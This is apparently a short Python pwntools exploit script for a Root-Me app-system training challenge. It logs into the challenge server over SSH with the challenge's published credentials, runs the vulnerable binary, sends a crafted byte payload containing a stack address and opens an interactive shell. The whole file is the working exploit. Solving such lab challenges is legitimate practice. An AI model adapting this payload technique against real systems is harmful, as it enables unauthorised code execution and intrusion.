# pwning
from pwn import *
p = ssh(host='challenge02.root-me.org',user='app-systeme-ch16',password='app-systeme-ch16',port=2222)
print p['ls']
ch13=p.process('./ch16')

ch13.sendline('\x08\x08\x08\x08\xbc\xfa\xff\xbf')
ch13.interactive()
